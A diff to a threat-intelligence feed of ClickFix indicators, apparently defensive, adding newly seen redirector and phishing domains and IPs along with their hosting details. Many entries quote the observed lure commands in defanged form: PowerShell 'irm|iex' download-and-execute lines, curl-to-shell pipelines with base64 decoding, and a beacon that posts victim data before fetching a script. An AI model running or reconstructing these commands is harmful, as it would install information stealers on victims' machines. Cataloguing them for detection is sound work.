@@ -5,8 +5,47 @@
   "short": "Fake checks that get victims to paste and run a command",
   "summary": "A fake CAPTCHA, browser update or error message, usually injected into a hacked legitimate website, copies a command to the clipboard and tells the victim to paste it into the Run dialog, a terminal or PowerShell. The command downloads and runs malware, typically an information stealer or a remote-access tool. Some campaigns fetch their next stage from a public blockchain so the hacked site never has to change."
  },
- "count": 4961,
+ "count": 4980,
  "indicators": [
+  {
+   "indicator": "1.234.27.94",
+   "type": "ip",
+   "category": "clickfix",
+   "campaign": null,
+   "role": "Redirector",
+   "status": "online",
+   "first_seen": "2026-11-06",
+   "last_seen": "2026-11-06",
+   "last_online": "2026-11-06",
+   "offline_since": null,
+   "url": "http://1.234.27.94:8000/",
+   "brand": null,
+   "product": null,
+   "hosting": "SK Broadband Co Ltd",
+   "dns": null,
+   "ip": null,
+   "asn": "AS9318",
+   "org": "SK Broadband Co Ltd",
+   "country": "KR",
+   "ips": [],
+   "hosts": [
+    {
+     "host": "1.234.27.94",
+     "status": "online",
+     "first_seen": "2026-11-06",
+     "last_seen": "2026-11-06"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "irm 'codes[.]browse-cdn[.]beer/[id]'|iex"
+   ],
+   "connects_to": [
+    "codes.browse-cdn.beer"
+   ],
+   "lure_from": []
+  },
   {
    "indicator": "100porcentopiaui.com.br",
    "type": "domain",
@@ -3261,6 +3300,45 @@
     "codes.caffe-img.com",
     "codes.browse-cdn.beer"
    ]
+  },
+  {
+   "indicator": "3.255.14.26",
+   "type": "ip",
+   "category": "clickfix",
+   "campaign": null,
+   "role": "Redirector",
+   "status": "online",
+   "first_seen": "2026-11-06",
+   "last_seen": "2026-11-06",
+   "last_online": "2026-11-06",
+   "offline_since": null,
+   "url": "https://3.255.14.26/",
+   "brand": null,
+   "product": null,
+   "hosting": "Amazon AWS",
+   "dns": null,
+   "ip": null,
+   "asn": "AS16509",
+   "org": "Amazon.com, Inc.",
+   "country": "IE",
+   "ips": [],
+   "hosts": [
+    {
+     "host": "3.255.14.26",
+     "status": "online",
+     "first_seen": "2026-11-06",
+     "last_seen": "2026-11-06"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "irm 'codes[.]browse-cdn[.]beer/[id]'|iex"
+   ],
+   "connects_to": [
+    "codes.browse-cdn.beer"
+   ],
+   "lure_from": []
   },
   {
    "indicator": "3.71.146.124",
@@ -18847,7 +18925,8 @@
     "ncheck-brows.beer"
    ],
    "lure_from": [
-    "codes.caffe-img.com"
+    "codes.caffe-img.com",
+    "codes.browse-cdn.beer"
    ]
   },
   {
@@ -21580,14 +21659,15 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "(irm 'hxxps[:]//cosmical2049[.]com/lom3/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
     "iex(irm 'hxxps[:]//copiose[.]org/lom/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})",
-    "curl -s $(echo \"[encoded]\" | base64 -d) | zsh"
+    "curl -s $(echo \"[encoded]\" | base64 -d) | zsh",
+    "(irm 'hxxps[:]//cosmical2049[.]com/lom3/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex"
    ],
    "connects_to": [
-    "cosmical2049.com",
     "copiose.org",
-    "escapeai.live"
+    "escapeai.live",
+    "cosmical2049.com",
+    "5ndcb8wp.bossbeymaster.click"
    ],
    "lure_from": [
     "mon-blanc-02.cfd",
@@ -21595,6 +21675,7 @@
     "interseq.at",
     "nikogdatakonebilo.cc",
     "efreitorher.org",
+    "pizdalisibivet.org",
     "yaebaltakuyusety.com",
     "pakistanskimalchik.org",
     "yaebalciganovvjopu.org",
@@ -27121,6 +27202,53 @@
    "lure_from": []
   },
   {
+   "indicator": "astarcarshire.co.uk",
+   "type": "domain",
+   "category": "clickfix",
+   "campaign": null,
+   "role": "Redirector",
+   "status": "online",
+   "first_seen": "2026-11-06",
+   "last_seen": "2026-11-06",
+   "last_online": "2026-11-06",
+   "offline_since": null,
+   "url": "https://astarcarshire.co.uk/",
+   "brand": null,
+   "product": null,
+   "hosting": "Namecheap",
+   "dns": "namecheaphosting.com",
+   "ip": "162.254.39.86",
+   "asn": "AS22612",
+   "org": "Namecheap, Inc.",
+   "country": "US",
+   "ips": [
+    {
+     "ip": "162.254.39.86",
+     "asn": "AS22612",
+     "org": "Namecheap, Inc.",
+     "first_seen": "2026-11-06",
+     "last_seen": "2026-11-06"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "astarcarshire.co.uk",
+     "status": "online",
+     "first_seen": "2026-11-06",
+     "last_seen": "2026-11-06"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex"
+   ],
+   "connects_to": [
+    "hagosuro.lc"
+   ],
+   "lure_from": []
+  },
+  {
    "indicator": "asteroidesproductions.com",
    "type": "domain",
    "category": "clickfix",
@@ -29322,9 +29450,9 @@
     "nikogdatakonebilo.cc",
     "efreitorher.org",
     "yaebalciganovvjopu.org",
+    "pizdalisibivet.org",
     "yaebaltakuyusety.com",
-    "pakistanskimalchik.org",
-    "ktoktotam.cc"
+    "pakistanskimalchik.org"
    ]
   },
   {
@@ -30045,6 +30173,80 @@
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/608-B8D3-712Fc1654E/849-b650-BC87849C3/B8-81-73-B6-DE-F4 | IEX"
    ],
    "connects_to": [],
+   "lure_from": []
+  },
+  {
+   "indicator": "b2bpharmahub.com",
+   "type": "domain",
+   "category": "clickfix",
+   "campaign": null,
+   "role": "Phishing page",
+   "status": "online",
+   "first_seen": "2026-10-26",
+   "last_seen": "2026-11-06",
+   "last_online": "2026-11-06",
+   "offline_since": null,
+   "url": "https://y54mr.b2bpharmahub.com/v5swfrr/f-3j94-do-023r.html",
+   "brand": "Webmail (generic)",
+   "product": "cPanel / Roundcube / Zimbra",
+   "hosting": "Cloudflare (proxied)",
+   "dns": "Cloudflare",
+   "ip": "104.21.13.23",
+   "asn": "AS13335",
+   "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+   "country": null,
+   "ips": [
+    {
+     "ip": "104.21.13.23",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-06",
+     "last_seen": "2026-11-06"
+    },
+    {
+     "ip": "172.64.80.1",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-06",
+     "last_seen": "2026-11-06"
+    },
+    {
+     "ip": "172.67.197.5",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-06",
+     "last_seen": "2026-11-06"
+    },
+    {
+     "ip": "188.114.97.3",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-10-26",
+     "last_seen": "2026-11-05"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "b2bpharmahub.com",
+     "status": "offline",
+     "first_seen": "2026-10-26",
+     "last_seen": "2026-11-05"
+    },
+    {
+     "host": "y54mr.b2bpharmahub.com",
+     "status": "online",
+     "first_seen": "2026-11-06",
+     "last_seen": "2026-11-06"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "(irm 'hxxp[:]//hagosuro[.]lc/captchasolve/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex"
+   ],
+   "connects_to": [
+    "hagosuro.lc"
+   ],
    "lure_from": []
   },
   {
@@ -39497,7 +39699,8 @@
     "ncheck-brows.beer"
    ],
    "lure_from": [
-    "codes.caffe-img.com"
+    "codes.caffe-img.com",
+    "codes.browse-cdn.beer"
    ]
   },
   {
@@ -40669,6 +40872,55 @@
     "lovezramexar.info",
     "makeverizyjar.info",
     "ncheck-brows.beer"
+   ]
+  },
+  {
+   "indicator": "blackpoppyrose.org",
+   "type": "domain",
+   "category": "clickfix",
+   "campaign": null,
+   "role": "Redirector",
+   "status": "online",
+   "first_seen": "2026-11-06",
+   "last_seen": "2026-11-06",
+   "last_online": "2026-11-06",
+   "offline_since": null,
+   "url": "https://blackpoppyrose.org/",
+   "brand": null,
+   "product": null,
+   "hosting": "Namecheap",
+   "dns": "Namecheap",
+   "ip": "162.0.212.6",
+   "asn": "AS22612",
+   "org": "NAMECHEAP-NET - Namecheap, Inc., US",
+   "country": "US",
+   "ips": [
+    {
+     "ip": "162.0.212.6",
+     "asn": "AS22612",
+     "org": "NAMECHEAP-NET - Namecheap, Inc., US",
+     "first_seen": "2026-11-06",
+     "last_seen": "2026-11-06"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "blackpoppyrose.org",
+     "status": "online",
+     "first_seen": "2026-11-06",
+     "last_seen": "2026-11-06"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex"
+   ],
+   "connects_to": [
+    "hagosuro.lc"
+   ],
+   "lure_from": [
+    "interseq.at"
    ]
   },
   {
@@ -44873,6 +45125,55 @@
    "lure_from": []
   },
   {
+   "indicator": "britbonuscasinos.co.uk",
+   "type": "domain",
+   "category": "clickfix",
+   "campaign": null,
+   "role": "Redirector",
+   "status": "online",
+   "first_seen": "2026-11-06",
+   "last_seen": "2026-11-06",
+   "last_online": "2026-11-06",
+   "offline_since": null,
+   "url": "https://www.britbonuscasinos.co.uk/",
+   "brand": null,
+   "product": null,
+   "hosting": "Cloudflare (proxied)",
+   "dns": "Cloudflare",
+   "ip": "104.21.73.25",
+   "asn": "AS13335",
+   "org": "Cloudflare, Inc.",
+   "country": "US",
+   "ips": [
+    {
+     "ip": "104.21.73.25",
+     "asn": "AS13335",
+     "org": "Cloudflare, Inc.",
+     "first_seen": "2026-11-06",
+     "last_seen": "2026-11-06"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "www.britbonuscasinos.co.uk",
+     "status": "online",
+     "first_seen": "2026-11-06",
+     "last_seen": "2026-11-06"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex"
+   ],
+   "connects_to": [
+    "hagosuro.lc"
+   ],
+   "lure_from": [
+    "interseq.at"
+   ]
+  },
+  {
    "indicator": "britishway.lk",
    "type": "domain",
    "category": "clickfix",
@@ -46225,6 +46526,60 @@
    ]
   },
   {
+   "indicator": "bulgetocchialieurope.com",
+   "type": "domain",
+   "category": "clickfix",
+   "campaign": null,
+   "role": "Redirector",
+   "status": "online",
+   "first_seen": "2026-11-06",
+   "last_seen": "2026-11-06",
+   "last_online": "2026-11-06",
+   "offline_since": null,
+   "url": "https://bulgetocchialieurope.com/",
+   "brand": "Meta",
+   "product": "Facebook",
+   "hosting": "Scaleway",
+   "dns": "servidoresdns.net",
+   "ip": "163.172.72.231",
+   "asn": "AS12876",
+   "org": "AS12876 Scaleway SAS, FR",
+   "country": "FR",
+   "ips": [
+    {
+     "ip": "163.172.72.231",
+     "asn": "AS12876",
+     "org": "AS12876 Scaleway SAS, FR",
+     "first_seen": "2026-11-06",
+     "last_seen": "2026-11-06"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "bulgetocchialieurope.com",
+     "status": "online",
+     "first_seen": "2026-11-06",
+     "last_seen": "2026-11-06"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "(irm 'hxxps[:]//gfisoda[.]biz/clickfix/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
+    "(irm 'hxxps[:]//hagosuro[.]lc/verify/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
+    "echo \"Checking...\" && echo '[encoded]' | base64 -d | bash && echo \"Done! ; curl -fsS 'hxxps[:]//joknsdfgjojipogfdfgsjksf[.]icu/x/verify' >/dev/null\""
+   ],
+   "connects_to": [
+    "gfisoda.biz",
+    "hagosuro.lc",
+    "joknsdfgjojipogfdfgsjksf.icu",
+    "buildkit95.tools"
+   ],
+   "lure_from": [
+    "interseq.at"
+   ]
+  },
+  {
    "indicator": "burberry-handbagsoutlet.com.co",
    "type": "domain",
    "category": "clickfix",
@@ -47061,6 +47416,59 @@
    ],
    "lure_from": [
     "interseq.at"
+   ]
+  },
+  {
+   "indicator": "byethost9.com",
+   "type": "domain",
+   "category": "clickfix",
+   "campaign": null,
+   "role": "Phishing page",
+   "status": "online",
+   "first_seen": "2026-11-06",
+   "last_seen": "2026-11-06",
+   "last_online": "2026-11-06",
+   "offline_since": null,
+   "url": "https://fungirl.byethost9.com/",
+   "brand": null,
+   "product": null,
+   "hosting": "AS Wildcard UK Limited",
+   "dns": "byet.org",
+   "ip": "185.27.134.55",
+   "asn": "AS34119",
+   "org": "WILDCARD-AS Wildcard UK Limited, GB",
+   "country": "GB",
+   "ips": [
+    {
+     "ip": "185.27.134.55",
+     "asn": "AS34119",
+     "org": "WILDCARD-AS Wildcard UK Limited, GB",
+     "first_seen": "2026-11-06",
+     "last_seen": "2026-11-06"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "fungirl.byethost9.com",
+     "status": "online",
+     "first_seen": "2026-11-06",
+     "last_seen": "2026-11-06"
+    }
+   ],
+   "actor": "dprk",
+   "actor_link": "linked",
+   "commands": [
+    "curl -sL -d \"id=eb04137a-91d7-4925-a2fd-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Ffungirl.byethost9.com%2F%3Fi%3D2&os=Mac%2015&lastVisitAt=2026-11-06T19%3A26%3A45.552Z&lastShellAt=2026-11-06T19%3A26%3A45.552Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"hxxps[:]//softify[.]lat/u/8ecec3ba\" | sh",
+    "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
+    "(irm 'hxxps[:]//lepafonso[.]bz/proliv_dante/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|&('i'+'e'+'x')"
+   ],
+   "connects_to": [
+    "softify.lat",
+    "fingerprint-veri.info",
+    "lepafonso.bz"
+   ],
+   "lure_from": [
+    "codes.browse-cdn.beer"
    ]
   },
   {
@@ -78483,6 +78891,53 @@
    "lure_from": []
   },
   {
+   "indicator": "e-cam.uk",
+   "type": "domain",
+   "category": "clickfix",
+   "campaign": null,
+   "role": "Redirector",
+   "status": "online",
+   "first_seen": "2026-11-06",
+   "last_seen": "2026-11-06",
+   "last_online": "2026-11-06",
+   "offline_since": null,
+   "url": "http://www.e-cam.uk/",
+   "brand": null,
+   "product": null,
+   "hosting": "One.com A/S",
+   "dns": "one.com",
+   "ip": "46.30.215.10",
+   "asn": "AS51468",
+   "org": "One.com A/S",
+   "country": "DK",
+   "ips": [
+    {
+     "ip": "46.30.215.10",
+     "asn": "AS51468",
+     "org": "One.com A/S",
+     "first_seen": "2026-11-06",
+     "last_seen": "2026-11-06"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "www.e-cam.uk",
+     "status": "online",
+     "first_seen": "2026-11-06",
+     "last_seen": "2026-11-06"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "irm 'codes[.]browse-cdn[.]beer/[id]'|iex"
+   ],
+   "connects_to": [
+    "codes.browse-cdn.beer"
+   ],
+   "lure_from": []
+  },
+  {
    "indicator": "e-nastava.ba",
    "type": "domain",
    "category": "clickfix",
@@ -89106,7 +89561,8 @@
     "ktoktotam.cc",
     "yaebaltakuyusety.com",
     "pakistanskimalchik.org",
-    "yaebalciganovvjopu.org"
+    "yaebalciganovvjopu.org",
+    "pizdalisibivet.org"
    ]
   },
   {
@@ -89725,6 +90181,7 @@
     "efreitorher.org",
     "yaebaltakuyusety.com",
     "yaebalciganovvjopu.org",
+    "pizdalisibivet.org",
     "ktoktotam.cc",
     "pakistanskimalchik.org"
    ]
@@ -91388,7 +91845,8 @@
     "nikogdatakonebilo.cc",
     "ktoktotam.cc",
     "efreitorher.org",
-    "yaebalciganovvjopu.org"
+    "yaebalciganovvjopu.org",
+    "pizdalisibivet.org"
    ]
   },
   {
@@ -93321,7 +93779,8 @@
    "lure_from": [
     "interseq.at",
     "efreitorher.org",
-    "yaebalciganovvjopu.org"
+    "yaebalciganovvjopu.org",
+    "pizdalisibivet.org"
    ]
   },
   {
@@ -96383,6 +96842,57 @@
    "lure_from": []
   },
   {
+   "indicator": "fromheretohaiti.org",
+   "type": "domain",
+   "category": "clickfix",
+   "campaign": null,
+   "role": "Redirector",
+   "status": "online",
+   "first_seen": "2026-11-06",
+   "last_seen": "2026-11-06",
+   "last_online": "2026-11-06",
+   "offline_since": null,
+   "url": "https://fromheretohaiti.org/",
+   "brand": null,
+   "product": null,
+   "hosting": "Sucuri",
+   "dns": "GoDaddy",
+   "ip": "192.124.249.32",
+   "asn": "AS30148",
+   "org": "SUCURI-SEC - Sucuri, US",
+   "country": "US",
+   "ips": [
+    {
+     "ip": "192.124.249.32",
+     "asn": "AS30148",
+     "org": "SUCURI-SEC - Sucuri, US",
+     "first_seen": "2026-11-06",
+     "last_seen": "2026-11-06"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "fromheretohaiti.org",
+     "status": "online",
+     "first_seen": "2026-11-06",
+     "last_seen": "2026-11-06"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "(irm 'hxxps[:]//lepafonso[.]bz/dantestraff2929/[id]' -UserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36' -Headers @{'X-WUA'='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36'} -TimeoutSec 45)|iex",
+    "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex"
+   ],
+   "connects_to": [
+    "lepafonso.bz",
+    "hagosuro.lc"
+   ],
+   "lure_from": [
+    "interseq.at"
+   ]
+  },
+  {
    "indicator": "frontalit.hu",
    "type": "domain",
    "category": "clickfix",
@@ -97282,6 +97792,57 @@
     "dns-api.org"
    ],
    "lure_from": []
+  },
+  {
+   "indicator": "fundacionmaterluz.cl",
+   "type": "domain",
+   "category": "clickfix",
+   "campaign": null,
+   "role": "Redirector",
+   "status": "online",
+   "first_seen": "2026-11-06",
+   "last_seen": "2026-11-06",
+   "last_online": "2026-11-06",
+   "offline_since": null,
+   "url": "https://fundacionmaterluz.cl/",
+   "brand": null,
+   "product": null,
+   "hosting": "- Servicios Informaticos Hostname Ltda",
+   "dns": "inc.cl",
+   "ip": "200.24.13.97",
+   "asn": "AS262256",
+   "org": "AS262256 - Servicios Informaticos Hostname Ltda, CL",
+   "country": "CL",
+   "ips": [
+    {
+     "ip": "200.24.13.97",
+     "asn": "AS262256",
+     "org": "AS262256 - Servicios Informaticos Hostname Ltda, CL",
+     "first_seen": "2026-11-06",
+     "last_seen": "2026-11-06"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "fundacionmaterluz.cl",
+     "status": "online",
+     "first_seen": "2026-11-06",
+     "last_seen": "2026-11-06"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "(irm 'hxxps[:]//lepafonso[.]bz/dantestraff2929/[id]' -UserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36' -Headers @{'X-WUA'='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36'} -TimeoutSec 45)|iex",
+    "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex"
+   ],
+   "connects_to": [
+    "lepafonso.bz",
+    "hagosuro.lc"
+   ],
+   "lure_from": [
+    "interseq.at"
+   ]
   },
   {
    "indicator": "fundacor.org.bo",
@@ -106769,6 +107330,7 @@
     "yaebaltakuyusety.com",
     "pakistanskimalchik.org",
     "yaebalciganovvjopu.org",
+    "pizdalisibivet.org",
     "ktoktotam.cc"
    ]
   },
@@ -114207,7 +114769,8 @@
     "ncheck-brows.beer"
    ],
    "lure_from": [
-    "codes.caffe-img.com"
+    "codes.caffe-img.com",
+    "codes.browse-cdn.beer"
    ]
   },
   {
@@ -120695,6 +121258,7 @@
     "nikogdatakonebilo.cc",
     "efreitorher.org",
     "yaebalciganovvjopu.org",
+    "pizdalisibivet.org",
     "ktoktotam.cc",
     "yaebaltakuyusety.com",
     "pakistanskimalchik.org"
@@ -120908,6 +121472,7 @@
     "nikogdatakonebilo.cc",
     "efreitorher.org",
     "yaebalciganovvjopu.org",
+    "pizdalisibivet.org",
     "yaebaltakuyusety.com",
     "pakistanskimalchik.org",
     "ktoktotam.cc"
@@ -123460,6 +124025,55 @@
    "lure_from": []
   },
   {
+   "indicator": "innconcert.ca",
+   "type": "domain",
+   "category": "clickfix",
+   "campaign": null,
+   "role": "Redirector",
+   "status": "online",
+   "first_seen": "2026-11-06",
+   "last_seen": "2026-11-06",
+   "last_online": "2026-11-06",
+   "offline_since": null,
+   "url": "https://innconcert.ca/",
+   "brand": null,
+   "product": null,
+   "hosting": "Cloudflare (proxied)",
+   "dns": "Cloudflare",
+   "ip": "104.21.82.184",
+   "asn": "AS13335",
+   "org": "Cloudflare, Inc.",
+   "country": "US",
+   "ips": [
+    {
+     "ip": "104.21.82.184",
+     "asn": "AS13335",
+     "org": "Cloudflare, Inc.",
+     "first_seen": "2026-11-06",
+     "last_seen": "2026-11-06"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "innconcert.ca",
+     "status": "online",
+     "first_seen": "2026-11-06",
+     "last_seen": "2026-11-06"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex"
+   ],
+   "connects_to": [
+    "hagosuro.lc"
+   ],
+   "lure_from": [
+    "interseq.at"
+   ]
+  },
+  {
    "indicator": "innenbau-rein.de",
    "type": "domain",
    "category": "clickfix",
@@ -123548,6 +124162,55 @@
    ],
    "connects_to": [],
    "lure_from": []
+  },
+  {
+   "indicator": "innorev.io",
+   "type": "domain",
+   "category": "clickfix",
+   "campaign": null,
+   "role": "Phishing page",
+   "status": "online",
+   "first_seen": "2026-11-06",
+   "last_seen": "2026-11-06",
+   "last_online": "2026-11-06",
+   "offline_since": null,
+   "url": "https://innorev.io/",
+   "brand": null,
+   "product": null,
+   "hosting": "IONOS",
+   "dns": "IONOS",
+   "ip": "74.208.236.54",
+   "asn": "AS8560",
+   "org": "IONOS-AS IONOS SE, DE",
+   "country": "US",
+   "ips": [
+    {
+     "ip": "74.208.236.54",
+     "asn": "AS8560",
+     "org": "IONOS-AS IONOS SE, DE",
+     "first_seen": "2026-11-06",
+     "last_seen": "2026-11-06"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "innorev.io",
+     "status": "online",
+     "first_seen": "2026-11-06",
+     "last_seen": "2026-11-06"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "iex(irm 'hxxps[:]//cosmical2049[.]com/wordpresscheck/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})"
+   ],
+   "connects_to": [
+    "cosmical2049.com"
+   ],
+   "lure_from": [
+    "sky.dolcefantasia.us"
+   ]
   },
   {
    "indicator": "innovafn.com",
@@ -124516,7 +125179,8 @@
     "id-verfied.boats"
    ],
    "lure_from": [
-    "codes.caffe-img.com"
+    "codes.caffe-img.com",
+    "codes.browse-cdn.beer"
    ]
   },
   {
@@ -129527,6 +130191,7 @@
     "nikogdatakonebilo.cc",
     "efreitorher.org",
     "yaebalciganovvjopu.org",
+    "pizdalisibivet.org",
     "yaebaltakuyusety.com",
     "pakistanskimalchik.org",
     "ktoktotam.cc"
@@ -129971,7 +130636,8 @@
    ],
    "lure_from": [
     "interseq.at",
-    "codes.caffe-img.com"
+    "codes.caffe-img.com",
+    "codes.browse-cdn.beer"
    ]
   },
   {
@@ -130663,7 +131329,8 @@
     "IRM glcdn[.]githack[.]com/675-ab67-6850a3f78/1eaec59f-d21e-4a31-993f-[id]/-/raw/main/a4F8-aCB97dD65d3D | IEX"
    ],
    "connects_to": [
-    "glcdn.githack.com"
+    "glcdn.githack.com",
+    "k0x9x0kz.bossbeymaster.click"
    ],
    "lure_from": []
   },
@@ -134149,6 +134816,53 @@
    "lure_from": [
     "interseq.at"
    ]
+  },
+  {
+   "indicator": "kappafunclub.fr",
+   "type": "domain",
+   "category": "clickfix",
+   "campaign": null,
+   "role": "Redirector",
+   "status": "online",
+   "first_seen": "2026-11-06",
+   "last_seen": "2026-11-06",
+   "last_online": "2026-11-06",
+   "offline_since": null,
+   "url": "https://www.kappafunclub.fr/",
+   "brand": null,
+   "product": null,
+   "hosting": "Amazon AWS",
+   "dns": "netim.net",
+   "ip": "3.255.14.26",
+   "asn": "AS16509",
+   "org": "Amazon.com, Inc.",
+   "country": "IE",
+   "ips": [
+    {
+     "ip": "3.255.14.26",
+     "asn": "AS16509",
+     "org": "Amazon.com, Inc.",
+     "first_seen": "2026-11-06",
+     "last_seen": "2026-11-06"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "www.kappafunclub.fr",
+     "status": "online",
+     "first_seen": "2026-11-06",
+     "last_seen": "2026-11-06"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "irm 'codes[.]browse-cdn[.]beer/[id]'|iex"
+   ],
+   "connects_to": [
+    "codes.browse-cdn.beer"
+   ],
+   "lure_from": []
   },
   {
    "indicator": "kaprychozas.rf.gd",
@@ -145938,6 +146652,7 @@
     "nikogdatakonebilo.cc",
     "efreitorher.org",
     "yaebalciganovvjopu.org",
+    "pizdalisibivet.org",
     "yaebaltakuyusety.com",
     "pakistanskimalchik.org",
     "ktoktotam.cc"
@@ -146075,13 +146790,14 @@
    "commands": [
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
+    "(irm 'hxxps[:]//lepafonso[.]bz/dantestraff2929/[id]' -UserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36' -Headers @{'X-WUA'='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36'} -TimeoutSec 45)|iex"
    ],
    "connects_to": [
-    "xorados.com",
     "hagosuro.lc",
+    "xorados.com",
     "trek-72.com",
     "t-trustrest.com",
+    "lepafonso.bz",
     "trustchecknes.com",
     "groverudder12.com"
    ],
@@ -146142,61 +146858,6 @@
    ],
    "connects_to": [
     "t-trustrest.com"
-   ],
-   "lure_from": [
-    "interseq.at"
-   ]
-  },
-  {
-   "indicator": "location-box-dordogne.com",
-   "type": "domain",
-   "category": "clickfix",
-   "campaign": null,
-   "role": "Redirector",
-   "status": "online",
-   "first_seen": "2026-11-01",
-   "last_seen": "2026-11-02",
-   "last_online": "2026-11-06",
-   "offline_since": null,
-   "url": "https://www.location-box-dordogne.com/",
-   "brand": null,
-   "product": null,
-   "hosting": "AS Infomaniak Network SA",
-   "dns": "infomaniak.com",
-   "ip": "2001:1600:0:aaaa::80:2b",
-   "asn": "AS29222",
-   "org": "Infomaniak-AS Infomaniak Network SA, CH",
-   "country": "CH",
-   "ips": [
-    {
-     "ip": "2001:1600:0:aaaa::80:2b",
-     "asn": "AS29222",
-     "org": "Infomaniak-AS Infomaniak Network SA, CH",
-     "first_seen": "2026-11-01",
-     "last_seen": "2026-11-02"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "www.location-box-dordogne.com",
-     "status": "online",
-     "first_seen": "2026-11-01",
-     "last_seen": "2026-11-02"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
-    "(irm 'hxxps[:]//t-trustrest[.]com/proliv2929/[id]')|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/proliv2929' >/dev/null"
-   ],
-   "connects_to": [
-    "t-trustrest.com",
-    "xorados.com",
-    "hagosuro.lc",
-    "groverudder12.com",
-    "trek-72.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -147296,6 +147957,57 @@
    "lure_from": [
